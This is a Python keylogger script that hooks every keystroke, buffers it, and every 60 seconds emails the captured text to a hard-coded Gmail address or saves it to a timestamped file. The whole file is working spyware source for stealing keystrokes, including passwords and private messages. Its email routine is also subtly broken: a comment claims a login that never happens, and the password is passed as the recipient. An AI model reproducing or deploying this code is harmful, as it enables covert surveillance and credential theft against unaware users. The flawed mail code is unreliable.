import keyboard
import smtplib
from threading import Timer
from datetime import datetime
import sys


SEND_REPORT_EVERY = 60  # 60 means 60 secs. Sends logs every 60 secs to below user mail
EMAIL_ADDRESS = "YOUR_MAIL_ID"
EMAIL_PASSWORD = "YOUR_MAIL_PASSWORD"
# EMAIL_PASSWORD = "YOUR_IN_APP_PASSWORD(16digits)"


class Keylogger:
    def __init__(self, interval, report_method="email"):  # we can set to report_method to local directory
        self.interval = interval
        self.report_method = report_method  # method of report generation

        self.log = ""  # log file content
        self.start_dt = datetime.now()  # record start datetimes
        self.end_dt = datetime.now()  # record end datetimes

    def callback(self, event):
        # callback whenever a key is pressed
        name = event.name
        if name == "space":
            # replace "space" with " "
            name = " "
        elif name == "enter":
            # replace "enter" with new line
            name = "[ENTER]\n"
        elif name == "decimal":
            # replace any decimal character with .
            name = "."
        else:
            # replace spaces with underscores
            name = name.replace(" ", "_")
            name = f"[{name.upper()}]"

        self.log += name  # add the string to 'log' string.
        # whenever a key is pressed, the button pressed is ammended to the string self.log

    def update_filename(self):
        # construct the filename to be identified with start and end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog_{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        # creates log file in current directory which contains the current keylogs
        # open the file in write mode
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def sendmail(self, email, password, message):
        # manages the connection with SMTP server
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # connect to smtp as TLS mode
        server.starttls()
        # login to gmail account
        server.sendmail(email, password, message)
        # terminates the session
        server.quit()

    def report(self):  # this method reports the keylogs after every period of time
        if self.log:
            # if there is something in the log file then report it
            self.end_dt = datetime.now()

            # update self.filename
            self.update_filename()

            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()

            # printing the contents of the file. You may uncommnt for less cmd output
            # print(f"[{self.filename}] - {self.log}")

            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)

        # set the thread as daemon, means it'll die whn main thread is dead
        timer.daemon = True

        # start the timer
        timer.start()

    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()

        # start the keylogger
        keyboard.on_release(callback=self.callback)

        # start reporting the keystrokes
        self.report()

        # block the current thread & wait till CTRL+C is pressed
        keyboard.wait()


# Keylogger class ends here =================================================

# now we'll begin instantiating the methods by calling main method

if __name__ == "__main__":

    data = sys.argv[1]
    if data == "email":
        # if you want keylogger to send logs to your mail id
        keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
        keylogger.start()
    elif data == "file":
        # if you want keylogger to save file to your local directory
        keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
        keylogger.start()
